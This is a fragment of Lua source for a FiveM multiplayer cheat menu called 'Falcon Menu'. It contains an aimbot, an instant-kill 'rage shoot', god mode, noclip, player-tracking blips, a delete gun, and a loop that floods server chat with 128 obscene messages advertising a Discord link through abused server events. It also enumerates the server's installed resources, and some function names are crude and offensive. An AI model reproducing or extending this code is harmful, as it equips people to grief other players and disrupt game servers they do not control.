    local ped = PlayerPedId()
    SetEntityProofs(ped, tog, tog, tog, tog, tog)
    SetPedCanRagdoll(ped, not tog)
end

local function ToggleNoclip()
    Noclipping = not Noclipping
    if Noclipping then
        SetEntityVisible(PlayerPedId(), false, false)
    else
        SetEntityRotation(GetVehiclePedIsIn(PlayerPedId(), 0), GetGameplayCamRot(2), 2, 1)
        SetEntityVisible(GetVehiclePedIsIn(PlayerPedId(), 0), true, false)
        SetEntityVisible(PlayerPedId(), true, false)
    end
end

function ToggleBlips()
    BlipsEnabled = not BlipsEnabled
    
    if not BlipsEnabled then
        for i = 1, #pblips do
            RemoveBlip(pblips[i])
        end
    else
        
        Citizen.CreateThread(function()
            pblips = {}
            while BlipsEnabled do
                local plist = GetActivePlayers()
                table.removekey(plist, PlayerId())
                for i = 1, #plist do
                    if NetworkIsPlayerActive(plist[i]) then
                        ped = GetPlayerPed(plist[i])
                        pblips[i] = GetBlipFromEntity(ped)
                        if not DoesBlipExist(pblips[i]) then
                            pblips[i] = AddBlipForEntity(ped)
                            SetBlipSprite(pblips[i], 1)
                            Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], true)
                        else
                            veh = GetVehiclePedIsIn(ped, false)
                            blipSprite = GetBlipSprite(pblips[i])
                            if not GetEntityHealth(ped) then
                                if blipSprite ~= 274 then
                                    SetBlipSprite(pblips[i], 274)
                                    Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], false)
                                end
                            elseif veh then
                                vehClass = GetVehicleClass(veh)
                                vehModel = GetEntityModel(veh)
                                if vehClass == 15 then
                                    if blipSprite ~= 422 then
                                        SetBlipSprite(pblips[i], 422)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], false)
                                    end
                                elseif vehClass == 16 then
                                    if vehModel == GetHashKey("besra") or vehModel == GetHashKey("hydra")
                                        or vehModel == GetHashKey("lazer") then
                                        if blipSprite ~= 424 then
                                            SetBlipSprite(pblips[i], 424)
                                            Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], false)
                                        end
                                    elseif blipSprite ~= 423 then
                                        SetBlipSprite(pblips[i], 423)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], false)
                                    end
                                elseif vehClass == 14 then
                                    if blipSprite ~= 427 then
                                        SetBlipSprite(pblips[i], 427)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], false)
                                    end
                                elseif vehModel == GetHashKey("insurgent") or vehModel == GetHashKey("insurgent2")
                                    or vehModel == GetHashKey("limo2") then 
                                    if blipSprite ~= 426 then
                                        SetBlipSprite(pblips[i], 426)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], false)
                                    end
                                elseif vehModel == GetHashKey("rhino") then 
                                    if blipSprite ~= 421 then
                                        SetBlipSprite(pblips[i], 421)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], false)
                                    end
                                elseif blipSprite ~= 1 then 
                                    SetBlipSprite(pblips[i], 1)
                                    Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], true)
                                end
                                

                                passengers = GetVehicleNumberOfPassengers(veh)
                                if passengers then
                                    if not IsVehicleSeatFree(veh, -1) then
                                        passengers = passengers + 1
                                    end
                                    ShowNumberOnBlip(pblips[i], passengers)
                                else
                                    HideNumberOnBlip(pblips[i])
                                end
                            else
                                

                                HideNumberOnBlip(pblips[i])
                                if blipSprite ~= 1 then 
                                    SetBlipSprite(pblips[i], 1)
                                    Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], true)
                                end
                            end
                            SetBlipRotation(pblips[i], math.ceil(GetEntityHeading(veh)))
                            SetBlipNameToPlayerName(pblips[i], plist[i])
                            SetBlipScale(pblips[i], 0.85)
                            

                            if IsPauseMenuActive() then
                                SetBlipAlpha(pblips[i], 255)
                            else
                                x1, y1 = table.unpack(GetEntityCoords(PlayerPedId(), true))
                                x2, y2 = table.unpack(GetEntityCoords(GetPlayerPed(plist[i]), true))
                                distance = (math.floor(math.abs(math.sqrt((x1 - x2) * (x1 - x2) + (y1 - y2) * (y1 - y2))) / -1)) + 900
                                if distance < 0 then
                                    distance = 0
                                elseif distance > 255 then
                                    distance = 255
                                end
                                SetBlipAlpha(pblips[i], distance)
                            end
                        end
                    end
                end
                Wait(0)
            end
        end)
    end
end

local function ShootAt(target, bone)
    local boneTarget = GetPedBoneCoords(target, GetEntityBoneIndexByName(target, bone), 0.0, 0.0, 0.0)
    SetPedShootsAtCoord(PlayerPedId(), boneTarget, true)
end

local function ShootAt2(target, bone, damage)
    local boneTarget = GetPedBoneCoords(target, GetEntityBoneIndexByName(target, bone), 0.0, 0.0, 0.0)
    local _, weapon = GetCurrentPedWeapon(PlayerPedId())
    ShootSingleBulletBetweenCoords(AddVectors(boneTarget, vector3(0, 0, 0.1)), boneTarget, damage, true, weapon, PlayerPedId(), true, true, 1000.0)
end

local function ShootAimbot(k)
    local plist = GetActivePlayers()
    for i = 1, #plist do
        local id = plist[i]
        if player ~= PlayerId() then
            if IsPlayerFreeAiming(PlayerId()) then
                local TargetPed = GetPlayerPed(player)
                local TargetPos = GetEntityCoords(TargetPed)
                local Exist = DoesEntityExist(TargetPed)
                local Visible = IsEntityVisible(TargetPed)
                local Dead = IsPlayerDead(TargetPed)

                if GetEntityHealth(TargetPed) <= 0 then
                    Dead = true
                end

                if Exist and not Dead then
                    if Visible then
                        local OnScreen, ScreenX, ScreenY = World3dToScreen2d(TargetPos.x, TargetPos.y, TargetPos.z, 0)
                        if OnScreen then
                            if HasEntityClearLosToEntity(PlayerPedId(), TargetPed, 17) then
                                local TargetCoords = GetPedBoneCoords(TargetPed, 31086, 0, 0, 0)
                                SetPedShootsAtCoord(PlayerPedId(), TargetCoords.x, TargetCoords.y, TargetCoords.z, 1)
                            end
                        end
                    end
                end
            end
        end
    end
end

if DeleteGun then
    local playerEntity = getEntity(PlayerId())
    if (IsPedInAnyVehicle(GetPlayerPed(-1), true) == false) then
        FiveM.Notify("~g~Delete Gun Enabled!~n~~w~Use The ~b~Pistol~n~~b~Aim ~w~and ~b~Shoot ~w~To Delete!")
        GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_PISTOL"), 999999, false, true)
        SetPedAmmo(GetPlayerPed(-1), GetHashKey("WEAPON_PISTOL"), 999999)
        if (GetSelectedPedWeapon(GetPlayerPed(-1)) == GetHashKey("WEAPON_PISTOL")) then
            if IsPlayerFreeAiming(PlayerId()) then
                if IsEntityAPed(playerEntity) then
                    if IsPedInAnyVehicle(playerEntity, true) then
                        if IsControlJustReleased(1, 142) then
                            SetEntityAsMissionEntity(GetVehiclePedIsIn(playerEntity, true), 1, 1)
                            DeleteEntity(GetVehiclePedIsIn(playerEntity, true))
                            SetEntityAsMissionEntity(playerEntity, 1, 1)
                            DeleteEntity(playerEntity)
                            FiveM.Notify("~g~Deleted!")
                        end
                    else
                        if IsControlJustReleased(1, 142) then
                            SetEntityAsMissionEntity(playerEntity, 1, 1)
                            DeleteEntity(playerEntity)
                            FiveM.Notify("~g~Deleted!")
                        end
                    end
                else
                    if IsControlJustReleased(1, 142) then
                        SetEntityAsMissionEntity(playerEntity, 1, 1)
                        DeleteEntity(playerEntity)
                        FiveM.Notify("~g~Deleted!")
                    end
                end
            end
        end
    end
end


local function RageShoot(target)
    if not IsPedDeadOrDying(target) then
        local boneTarget = GetPedBoneCoords(target, GetEntityBoneIndexByName(target, "SKEL_HEAD"), 0.0, 0.0, 0.0)
        local _, weapon = GetCurrentPedWeapon(PlayerPedId())
        ShootSingleBulletBetweenCoords(AddVectors(boneTarget, vector3(0, 0, 0.1)), boneTarget, 9999, true, weapon, PlayerPedId(), false, false, 1000.0)
        ShootSingleBulletBetweenCoords(AddVectors(boneTarget, vector3(0, 0.1, 0)), boneTarget, 9999, true, weapon, PlayerPedId(), false, false, 1000.0)
        ShootSingleBulletBetweenCoords(AddVectors(boneTarget, vector3(0.1, 0, 0)), boneTarget, 9999, true, weapon, PlayerPedId(), false, false, 1000.0)
    end
end

if spam then                                                                                                                                                   
    TriggerServerEvent('chatEvent', message)
    TriggerServerEvent('_chat:messageEntered', "", { 255, 255, 255 }, message)
    TriggerServerEvent('playerDied', message)   
end

function RapeAllFunc()
    for i = 0, 128 do
        TriggerServerEvent(
    '_chat:messageEntered',
    'Falcon',
    {0, 0x99, 255},
    '^1T^2h^3e ^4s^5e^6r^7v^8e^9r ^1j^2u^3s^4t ^1g^2o^3t ^1f^2u^3c^4k^5e^6d ^1b^2y ^1F^3a^4l^5c^6o^7n ^1M^2e^3n^4u: ~ 3.0 https://discord.gg/y7xyNeG'
)
    TriggerServerEvent('_chat:messageEntered', '^1T^2h^3e ^4s^5e^6r^7v^8e^9r ^1j^2u^3s^4t ^1g^2o^3t ^1f^2u^3c^4k^5e^6d ^1b^2y ^1F^3a^4l^5c^6o^7n ^1M^2e^3n^4u: ~ 3.0 https://discord.gg/y7xyNeG', {0, 0x99, 255}, '^1T^2h^3e ^4s^5e^6r^7v^8e^9r ^1j^2u^3s^4t ^1g^2o^3t ^1f^2u^3c^4k^5e^6d ^1b^2y ^1F^3a^4l^5c^6o^7n ^1M^2e^3n^4u: ~ 3.0 https://discord.gg/y7xyNeG')
    end
end

local function NameToBone(name)
    if name == "Head" then
        return "SKEL_Head"
    elseif name == "Chest" then
        return "SKEL_Spine2"
    elseif name == "Left Arm" then
        return "SKEL_L_UpperArm"
    elseif name == "Right Arm" then
        return "SKEL_R_UpperArm"
    elseif name == "Left Leg" then
        return "SKEL_L_Thigh"
    elseif name == "Right Leg" then
        return "SKEL_R_Thigh"
    elseif name == "Dick" then
        return "SKEL_Pelvis"
    else
        return "SKEL_ROOT"
    end
end

local function SpawnVeh(model, PlaceSelf, SpawnEngineOn, vehiclesSpawnUpgraded, spawnvehgo)
    RequestModel(GetHashKey(model))
    Wait(500)
    if HasModelLoaded(GetHashKey(model)) then
        local coords = GetEntityCoords(PlayerPedId())
        local xf = GetEntityForwardX(PlayerPedId())
        local yf = GetEntityForwardY(PlayerPedId())
        local heading = GetEntityHeading(PlayerPedId())
        local veh = CreateVehicle(GetHashKey(model), coords.x + xf * 5, coords.y + yf * 5, coords.z, heading, 1, 1)
        if PlaceSelf then SetPedIntoVehicle(PlayerPedId(), veh, -1) end
        if SpawnEngineOn then SetVehicleEngineOn(veh, 1, 1) end
        if vehiclesSpawnUpgraded then maxUpgrades(veh) end
        if spawnvehgod then VehGod(veh) end
        SetVehRadioStation(veh, 'OFF')
        return veh
    else FiveM.Subtitle("~r~Can't spawn this vehicle") end
end

local function SpawnVehAtCoords(model, coords)
    RequestModel(GetHashKey(model))
    Wait(500)
    if HasModelLoaded(GetHashKey(model)) then
		local veh = CreateVehicle(GetHashKey(model), coords.x + 1.0, coords.y + 1.0, coords.z, 0.0, 1, 1)
		ShowInfo("Vehicle ~g~Spawned")
		return veh
    else ShowInfo("~r~Model not recognized (Try Again)") end
end

local function SpawnPlane(model, PlaceSelf, SpawnInAir)
    RequestModel(GetHashKey(model))
    Wait(500)
    if HasModelLoaded(GetHashKey(model)) then
        local coords = GetEntityCoords(PlayerPedId())
        local xf = GetEntityForwardX(PlayerPedId())
        local yf = GetEntityForwardY(PlayerPedId())
        local heading = GetEntityHeading(PlayerPedId())
        local veh = nil
        if SpawnInAir then
            veh = CreateVehicle(GetHashKey(model), coords.x + xf * 20, coords.y + yf * 20, coords.z + 500, heading, 1, 1)
        else
            veh = CreateVehicle(GetHashKey(model), coords.x + xf * 5, coords.y + yf * 5, coords.z, heading, 1, 1)
        end
        if PlaceSelf then SetPedIntoVehicle(PlayerPedId(), veh, -1) end
    else ShowInfo("~r~Model not recognized (Try Again)") end
end


local function GetCurrentOutfit(target)
    local ped = GetPlayerPed(target)
    outfit = {}
    
    outfit.hat = GetPedPropIndex(ped, 0)
    outfit.hat_texture = GetPedPropTextureIndex(ped, 0)
    
    outfit.glasses = GetPedPropIndex(ped, 1)
    outfit.glasses_texture = GetPedPropTextureIndex(ped, 1)
    
    outfit.ear = GetPedPropIndex(ped, 2)
    outfit.ear_texture = GetPedPropTextureIndex(ped, 2)
    
    outfit.watch = GetPedPropIndex(ped, 6)
    outfit.watch_texture = GetPedPropTextureIndex(ped, 6)
    
    outfit.wrist = GetPedPropIndex(ped, 7)
    outfit.wrist_texture = GetPedPropTextureIndex(ped, 7)
    
    outfit.head_drawable = GetPedDrawableVariation(ped, 0)
    outfit.head_palette = GetPedPaletteVariation(ped, 0)
    outfit.head_texture = GetPedTextureVariation(ped, 0)
    
    outfit.beard_drawable = GetPedDrawableVariation(ped, 1)
    outfit.beard_palette = GetPedPaletteVariation(ped, 1)
    outfit.beard_texture = GetPedTextureVariation(ped, 1)
    
    outfit.hair_drawable = GetPedDrawableVariation(ped, 2)
    outfit.hair_palette = GetPedPaletteVariation(ped, 2)
    outfit.hair_texture = GetPedTextureVariation(ped, 2)
    
    outfit.torso_drawable = GetPedDrawableVariation(ped, 3)
    outfit.torso_palette = GetPedPaletteVariation(ped, 3)
    outfit.torso_texture = GetPedTextureVariation(ped, 3)
    
    outfit.legs_drawable = GetPedDrawableVariation(ped, 4)
    outfit.legs_palette = GetPedPaletteVariation(ped, 4)
    outfit.legs_texture = GetPedTextureVariation(ped, 4)
    
    outfit.hands_drawable = GetPedDrawableVariation(ped, 5)
    outfit.hands_palette = GetPedPaletteVariation(ped, 5)
    outfit.hands_texture = GetPedTextureVariation(ped, 5)
    
    outfit.foot_drawable = GetPedDrawableVariation(ped, 6)
    outfit.foot_palette = GetPedPaletteVariation(ped, 6)
    outfit.foot_texture = GetPedTextureVariation(ped, 6)
    
    outfit.acc1_drawable = GetPedDrawableVariation(ped, 7)
    outfit.acc1_palette = GetPedPaletteVariation(ped, 7)
    outfit.acc1_texture = GetPedTextureVariation(ped, 7)
    
    outfit.acc2_drawable = GetPedDrawableVariation(ped, 8)
    outfit.acc2_palette = GetPedPaletteVariation(ped, 8)
    outfit.acc2_texture = GetPedTextureVariation(ped, 8)
    
    outfit.acc3_drawable = GetPedDrawableVariation(ped, 9)
    outfit.acc3_palette = GetPedPaletteVariation(ped, 9)
    outfit.acc3_texture = GetPedTextureVariation(ped, 9)
    
    outfit.mask_drawable = GetPedDrawableVariation(ped, 10)
    outfit.mask_palette = GetPedPaletteVariation(ped, 10)
    outfit.mask_texture = GetPedTextureVariation(ped, 10)
    
    outfit.aux_drawable = GetPedDrawableVariation(ped, 11)
    outfit.aux_palette = GetPedPaletteVariation(ped, 11)
    outfit.aux_texture = GetPedTextureVariation(ped, 11)
    
    return outfit
end

local function SetCurrentOutfit(outfit)
    local ped = PlayerPedId()
    
    SetPedPropIndex(ped, 0, outfit.hat, outfit.hat_texture, 1)
    SetPedPropIndex(ped, 1, outfit.glasses, outfit.glasses_texture, 1)
    SetPedPropIndex(ped, 2, outfit.ear, outfit.ear_texture, 1)
    SetPedPropIndex(ped, 6, outfit.watch, outfit.watch_texture, 1)
    SetPedPropIndex(ped, 7, outfit.wrist, outfit.wrist_texture, 1)
    
    SetPedComponentVariation(ped, 0, outfit.head_drawable, outfit.head_texture, outfit.head_palette)
    SetPedComponentVariation(ped, 1, outfit.beard_drawable, outfit.beard_texture, outfit.beard_palette)
    SetPedComponentVariation(ped, 2, outfit.hair_drawable, outfit.hair_texture, outfit.hair_palette)
    SetPedComponentVariation(ped, 3, outfit.torso_drawable, outfit.torso_texture, outfit.torso_palette)
    SetPedComponentVariation(ped, 4, outfit.legs_drawable, outfit.legs_texture, outfit.legs_palette)
    SetPedComponentVariation(ped, 5, outfit.hands_drawable, outfit.hands_texture, outfit.hands_palette)
    SetPedComponentVariation(ped, 6, outfit.foot_drawable, outfit.foot_texture, outfit.foot_palette)
    SetPedComponentVariation(ped, 7, outfit.acc1_drawable, outfit.acc1_texture, outfit.acc1_palette)
    SetPedComponentVariation(ped, 8, outfit.acc2_drawable, outfit.acc2_texture, outfit.acc2_palette)
    SetPedComponentVariation(ped, 9, outfit.acc3_drawable, outfit.acc3_texture, outfit.acc3_palette)
    SetPedComponentVariation(ped, 10, outfit.mask_drawable, outfit.mask_texture, outfit.mask_palette)
    SetPedComponentVariation(ped, 11, outfit.aux_drawable, outfit.aux_texture, outfit.aux_palette)
end

local function GetResources()
    local resources = {}
    for i = 1, GetNumResources() do
        resources[i] = GetResourceByFindIndex(i)
    end
    return resources
end

function IsResourceInstalled(name)
    local resources = GetResources()
    for i = 1, #resources do
        if resources[i] == name then
            return true
        else
            return false
        end
    end
end


function Falcon.SetFont(id, font)
    buttonFont = font
    menus[id].titleFont = font
end

function Falcon.SetMenuFocusBackgroundColor(id, r, g, b, a)
    setMenuProperty(id, "menuFocusBackgroundColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuFocusBackgroundColor.a})
end

function Falcon.SetMaxOptionCount(id, count)
    setMenuProperty(id, 'maxOptionCount', count)
end

function Falcon.PopupWindow(x, y, title)

end


    function Falcon.SetTheme(id, theme)
        if theme == "basic" then
            Falcon.SetMenuBackgroundColor(id, 81, 231, 251, 125)
            Falcon.SetTitleBackgroundColor(id, 92, 212, 249, 80)
            Falcon.SetTitleColor(id, 92, 212, 249, 230)
            Falcon.SetMenuSubTextColor(id, 255, 255, 255, 230)
            Falcon.SetMenuFocusColor(id, 40, 40, 40, 230)
            Falcon.SetFont(id, 7)
            Falcon.SetMenuX(id, .75)
            Falcon.SetMenuY(id, .1)
            Falcon.SetMenuWidth(id, 0.23)
            Falcon.SetMaxOptionCount(id, 12)
            
            titleHeight = 0.11 
            titleXOffset = 0.5 
            titleYOffset = 0.03 
            titleSpacing = 2 
            buttonHeight = 0.038 
            buttonScale = 0.365 
            buttonTextXOffset = 0.005 
            buttonTextYOffset = 0.005 
            
            themecolor = '~b~'
            themearrow = "+"
        elseif theme == "dark" then
            Falcon.SetMenuBackgroundColor(id, 180, 80, 80, 125)
            Falcon.SetTitleBackgroundColor(id, 180, 80, 80, 90)
            Falcon.SetTitleColor(id, 180, 80, 80, 230)
            Falcon.SetMenuSubTextColor(id, 255, 255, 255, 230)
            Falcon.SetMenuFocusColor(id, 40, 40, 40, 230)
            Falcon.SetFont(id, 1)
            Falcon.SetMenuX(id, .75)
            Falcon.SetMenuY(id, .1)
            Falcon.SetMenuWidth(id, 0.23)
            Falcon.SetMaxOptionCount(id, 12)
            
            titleHeight = 0.11 
            titleXOffset = 0.5 
            titleYOffset = 0.03 
            titleSpacing = 2 
            buttonHeight = 0.038 
            buttonScale = 0.365 
            buttonTextXOffset = 0.005 
            buttonTextYOffset = 0.005 
            
            themecolor = '~r~'
            themearrow = ">"
        elseif theme == "Falcon" then Falcon.SetMenuBackgroundColor(id, 0, 0, 0, 200) Falcon.SetTitleBackgroundColor(id, 0, 0, 0, 200) Falcon.SetTitleColor(id, 92, 212, 249, 170) Falcon.SetMenuSubTextColor(id, 255, 255, 255, 230)
            Falcon.SetFont(id, 0) Falcon.SetMenuX(id, .75) Falcon.SetMenuY(id, .1) Falcon.SetMenuWidth(id, 0.22) Falcon.SetMaxOptionCount(id, 12) titleHeight = 0.11 titleXOffset = 0.5 titleYOffset = 0.03 titleSpacing = 2 buttonHeight = 0.038 buttonScale = 0.365 buttonTextXOffset = 0.005 buttonTextYOffset = 0.005 themecolor = '' themearrow = "" titleHeight = 0.11 titleXOffset = 0.5 titleYOffset = 0.03 titleSpacing = 2 buttonHeight = 0.038 buttonScale = 0.365 buttonTextXOffset = 0.005 buttonTextYOffset = 0.005 themecolor = '' themearrow = ""
        elseif theme == "infamous" then
            Falcon.SetMenuBackgroundColor(id, 38, 38, 38, 80)
            Falcon.SetTitleBackgroundColor(id, 92, 212, 249, 170)
            Falcon.SetTitleColor(id, 240, 240, 240, 255)
            Falcon.SetMenuSubTextColor(id, 240, 240, 240, 255)
            Falcon.SetMenuFocusBackgroundColor(id, 100, 220, 250, 180)
            Falcon.SetFont(id, 4)
            Falcon.SetMenuX(id, .725)
            Falcon.SetMenuY(id, .1)
            Falcon.SetMenuWidth(id, 0.25)
            Falcon.SetMaxOptionCount(id, 12)
            
            titleHeight = 0.07 
            titleXOffset = 0.2 
            titleYOffset = 0.005 
            titleScale = 0.7 
            titleSpacing = 1.5
            buttonHeight = 0.033 
            buttonScale = 0.360 
            buttonTextXOffset = 0.003 
            buttonTextYOffset = 0.0025 
            
            themecolor = "~s~"
            themearrow = ">>"
        end
    end

function Falcon.InitializeTheme()
    for i = 1, #menulist do
        Falcon.SetTheme(menulist[i], theme)
    end
end


function Falcon.ComboBox2(text, items, currentIndex, selectedIndex, callback)
	local itemsCount = #items
	local selectedItem = items[currentIndex]
	local isCurrent = menus[currentMenu].currentOption == (optionCount + 1)

	if itemsCount > 1 and isCurrent then
		selectedItem = tostring(selectedItem)
	end

	if Falcon.Button(text, selectedItem) then
		selectedIndex = currentIndex
		callback(currentIndex, selectedIndex)
		return true
	elseif isCurrent then
		if currentKey == keys.left then
            if currentIndex > 1 then currentIndex = currentIndex - 1 
            elseif currentIndex == 1 then currentIndex = 1 end
		elseif currentKey == keys.right then
            if currentIndex < itemsCount then  currentIndex = currentIndex + 1 
            elseif currentIndex == itemsCount then currentIndex = itemsCount end
		end
	else
		currentIndex = selectedIndex
	end

	callback(currentIndex, selectedIndex)
    return false
end


function Falcon.ComboBoxSlider(text, items, currentIndex, selectedIndex, callback)
	local itemsCount = #items
	local selectedItem = items[currentIndex]
	local isCurrent = menus[currentMenu].currentOption == (optionCount + 1)

	if itemsCount > 1 and isCurrent then
		selectedItem = tostring(selectedItem)
	end

	if Falcon.Button2(text, items, itemsCount, currentIndex) then
		selectedIndex = currentIndex
		callback(currentIndex, selectedIndex)
		return true
	elseif isCurrent then
		if currentKey == keys.left then
            if currentIndex > 1 then currentIndex = currentIndex - 1 
            elseif currentIndex == 1 then currentIndex = 1 end
		elseif currentKey == keys.right then
            if currentIndex < itemsCount then currentIndex = currentIndex + 1 
            elseif currentIndex == itemsCount then currentIndex = itemsCount end
		end
	else
		currentIndex = selectedIndex
    end
	callback(currentIndex, selectedIndex)
	return false
end

local function drawButton2(text, items, itemsCount, currentIndex)
	local x = menus[currentMenu].x + menus[currentMenu].width / 2
	local multiplier = nil

	if menus[currentMenu].currentOption <= menus[currentMenu].maxOptionCount and optionCount <= menus[currentMenu].maxOptionCount then
		multiplier = optionCount
	elseif optionCount > menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount and optionCount <= menus[currentMenu].currentOption then
		multiplier = optionCount - (menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount)
	end

	if multiplier then
		local y = menus[currentMenu].y + titleHeight + buttonHeight + (buttonHeight * multiplier) - buttonHeight / 2
		local backgroundColor = nil
		local textColor = nil
		local subTextColor = nil
		local shadow = false

		if menus[currentMenu].currentOption == optionCount then
			backgroundColor = menus[currentMenu].menuFocusBackgroundColor
			textColor = menus[currentMenu].menuFocusTextColor
			subTextColor = menus[currentMenu].menuFocusTextColor
		else
			backgroundColor = menus[currentMenu].menuBackgroundColor
			textColor = menus[currentMenu].menuTextColor
			subTextColor = menus[currentMenu].menuSubTextColor
			shadow = true
		end

        local sliderWidth = ((menus[currentMenu].width / 3) / itemsCount) 
        local subtractionToX = ((sliderWidth * (currentIndex + 1)) - (sliderWidth * currentIndex)) / 2

        local XOffset = 0.16 
        local stabilizer = 1


        if itemsCount >= 40 then
            stabilizer = 1.005
        end
		
        drawRect(x, y, menus[currentMenu].width, buttonHeight, backgroundColor) 
        drawRect(((menus[currentMenu].x + 0.1675) + (subtractionToX * itemsCount)) / stabilizer, y, sliderWidth * (itemsCount - 1), buttonHeight / 2, {r = 110, g = 110, b = 110, a = 150}) 
        drawRect(((menus[currentMenu].x + 0.1675) + (subtractionToX * currentIndex)) / stabilizer, y, sliderWidth * (currentIndex - 1), buttonHeight / 2, {r = 200, g = 200, b = 200, a = 140}) 
        drawText(text, menus[currentMenu].x + buttonTextXOffset, y - (buttonHeight / 2) + buttonTextYOffset, buttonFont, textColor, buttonScale, false, shadow) 


        local CurrentItem = tostring(items[currentIndex])
        if string.len(CurrentItem) == 1 then XOffset = 0.1650
        elseif string.len(CurrentItem) == 2 then XOffset = 0.1625
        elseif string.len(CurrentItem) == 3 then XOffset = 0.16015
        elseif string.len(CurrentItem) == 4 then XOffset = 0.1585
        elseif string.len(CurrentItem) == 5 then XOffset = 0.1570
        elseif string.len(CurrentItem) >= 6 then XOffset = 0.1555
        end
        drawText(items[currentIndex], ((menus[currentMenu].x + XOffset) + 0.04) / stabilizer, y - (buttonHeight / 2.15) + buttonTextYOffset, buttonFont, {r = 255, g = 255, b = 255, a = 255}, buttonScale, false, shadow)
	end
end


function roundNum(num, numDecimalPlaces)
    local mult = 10^(numDecimalPlaces or 0)
    return math.floor(num * mult + 0.5) / mult
  end

function Falcon.Button2(text, items, itemsCount, currentIndex)
	local buttonText = text

	if menus[currentMenu] then
		optionCount = optionCount + 1

		local isCurrent = menus[currentMenu].currentOption == optionCount

		drawButton2(text, items, itemsCount, currentIndex)

		if isCurrent then
			if currentKey == keys.select then
				PlaySoundFrontend(-1, menus[currentMenu].buttonPressedSound.name, menus[currentMenu].buttonPressedSound.set, true)
				debugPrint(buttonText..' button pressed')
				return true
			elseif currentKey == keys.left or currentKey == keys.right then
				PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
			end
		end

		return false
	else
		debugPrint('Failed to create '..buttonText..' button: '..tostring(currentMenu)..' menu doesn\'t exist')

		return false
	end
end

Resources = GetResources()

ResourcesToCheck = {

        "es_extended", "esx_dmvschool", "esx_policejob", "",

        "vrp", "vrp_trucker", "vrp_TruckerJob"
}

print("\n\nRESOURCES FOUND\n________________\n")
for i = 1, #Resources do
    print(Resources[i])
end
print("\n________________\nEND OF RESOURCES\n")


Citizen.CreateThread(function()
    if mpMessage then ShowMPMessage(startMessage, subMessage, 50) else ShowInfo(startMessage .. " " .. subMessage) end
    ShowInfo(motd)
    FiveM.Subtitle2("~b~If you find any bugs, please contact ~r~JoeMoeDinHoeMoe#1325")



    
    local currThemeIndex = 1
    local selThemeIndex = 1

    local currFaceIndex = GetPedDrawableVariation(PlayerPedId(), 0) + 1
    local selFaceIndex = GetPedDrawableVariation(PlayerPedId(), 0) + 1

    local currFtextureIndex = GetPedTextureVariation(PlayerPedId(), 0) + 1 
    local selFtextureIndex = GetPedTextureVariation(PlayerPedId(), 0) + 1 

    local currHairIndex = GetPedDrawableVariation(PlayerPedId(), 2) + 1
    local selHairIndex = GetPedDrawableVariation(PlayerPedId(), 2) + 1

    local currHairTextureIndex = GetPedTextureVariation(PlayerPedId(), 2) + 1
    local selHairTextureIndex = GetPedTextureVariation(PlayerPedId(), 2) + 1

    local currMaskIndex = GetPedDrawableVariation(PlayerPedId(), 1) + 1
    local selMaskIndex = GetPedDrawableVariation(PlayerPedId(), 1) + 1

	local currHatIndex = GetPedPropIndex(PlayerPedId(), 0) + 1
    local selHatIndex = GetPedPropIndex(PlayerPedId(), 0) + 1
    
    if currHatIndex == 0 or currHatIndex == 1 then 
        currHatIndex = 9
        selHatIndex = 9
    end

	local currHatTextureIndex = GetPedPropTextureIndex(PlayerPedId(), 0)
    local selHatTextureIndex = GetPedPropTextureIndex(PlayerPedId(), 0)


    if currHatTextureIndex == -1 or currHatTextureIndex == 0 then
        currHatTextureIndex = 1
        selHatTextureIndex = 1
    end
    
	local currPFuncIndex = 1
    local selPFuncIndex = 1
    
    local currPFuncIndexx = 1
	local selPFuncIndexx = 1
	
	local currSPFuncIndex = 1
	local selSPFuncIndex = 1
	
	local currVFuncIndex = 1
    local selVFuncIndex = 1
    
    local currVFuncIndexxx = 1
	local selVFuncIndexxx = 1
	
	local currSeatIndex = 1
	local selSeatIndex = 1
	
	local currTireIndex = 1
	local selTireIndex = 1
	
    local currNoclipSpeedIndex = 1
    local selNoclipSpeedIndex = 1
    
    local currForcefieldRadiusIndex = 1
    local selForcefieldRadiusIndex = 1
    
    local currFastRunIndex = 1
    local selFastRunIndex = 1
    
    local currFastSwimIndex = 1
    local selFastSwimIndex = 1

    local currObjIndex = 1
    local selObjIndex = 1
    
    local currRotationIndex = 3
    local selRotationIndex = 3
    
    local currDirectionIndex = 1
    local selDirectionIndex = 1
    
    local Outfits = {}
    local currClothingIndex = 1
    local selClothingIndex = 1

    local selClothingIndexx = 1

    local currClothingIndexxx = 1
    local selClothingIndexxx = 1
    
    local currGravIndex = 3
    local selGravIndex = 3
    
    local currSpeedIndex = 1
    local selSpeedIndex = 1

    local currSpeedIndex2 = 1
    local selSpeedIndex2 = 1
    
    local currAttackTypeIndex = 1
    local selAttackTypeIndex = 1
    
    local currESPDistance = 3
    local selESPDistance = 3
	
	local currESPRefreshIndex = 1
	local selESPRefreshIndex = 1
    
    local currAimbotBoneIndex = 1
    local selAimbotBoneIndex = 1
    
    local currSaveLoadIndex1 = 1
    local selSaveLoadIndex1 = 1
    local currSaveLoadIndex2 = 1
    local selSaveLoadIndex2 = 1
    local currSaveLoadIndex3 = 1
    local selSaveLoadIndex3 = 1
    local currSaveLoadIndex4 = 1
    local selSaveLoadIndex4 = 1
    local currSaveLoadIndex5 = 1
    local selSaveLoadIndex5 = 1
    
    local currRadioIndex = 1
    local selRadioIndex = 1

    local currWeatherIndex = 1
    local selWeatherIndex = 1


    local TrackedPlayer = nil
	local SpectatedPlayer = nil
	local FlingedPlayer = nil
    local PossessingVeh = false
	local pvblip = nil
	local pvehicle = nil
    local pvehicleText = ""
	local IsPlayerHost = nil
	
	if NetworkIsHost() then
		IsPlayerHost = "~g~Yes"
	else
		IsPlayerHost = "~r~No"
	end
	
    local savedpos1 = nil
    local savedpos2 = nil
